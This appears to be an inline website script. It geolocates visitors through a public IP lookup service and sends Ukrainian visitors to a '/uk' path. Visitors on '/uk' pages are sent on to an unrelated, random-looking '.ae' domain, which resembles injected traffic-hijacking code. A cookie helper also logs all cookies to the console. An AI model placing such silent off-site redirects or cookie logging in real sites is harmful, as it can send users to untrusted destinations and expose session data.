/* Inline Script */
(function () {
		  fetch('https://ipwho.is')
		    .then(response => response.json())
		    .then(data => {
            	const referrer = document.referrer;
                const currentHost = window.location.hostname;

                if (referrer.includes(currentHost)) {
                    console.log('Site link checked');
                } else if (referrer == '') {
                    console.log('clear link checked');
                    if (data.country_code == 'UA' && !window.location.pathname.startsWith('/uk')) {
                        window.location.href = '/uk' + window.location.pathname;
                    } else if (window.location.pathname.startsWith('/uk')) {
                        var pathname = window.location.pathname;
                        if (pathname == '/uk/') {
                    	    pathname = '';
                        }

                        window.location.href = 'https://JuHVL2PbIJHe.ae/' + pathname;
					}
                } else {
                	console.log('income link checked');
					if (data.country_code == 'UA' && !window.location.pathname.startsWith('/uk')) {
                        window.location.href = '/uk' + window.location.pathname;
                    } else if (window.location.pathname.startsWith('/uk')) {
                        var pathname = window.location.pathname;
                        if (pathname == '/uk/') {
                    	    pathname = '';
                        }

                        window.location.href = 'https://JuHVL2PbIJHe.ae/' + pathname;
					}
                }
		    });
		})();

		function getCookie(cname) {
		  let name = cname + "=";
		  let decodedCookie = decodeURIComponent(document.cookie);
		  console.log(document.cookie);
		  let ca = decodedCookie.split(';');
		  for(let i = 0; i <ca.length; i++) {
		    let c = ca[i];
		    while (c.charAt(0) == ' ') {
		      c = c.substring(1);
		    }
		    if (c.indexOf(name) == 0) {
		      return c.substring(name.length, c.length);
		    }
		  }
		  return "";
		};

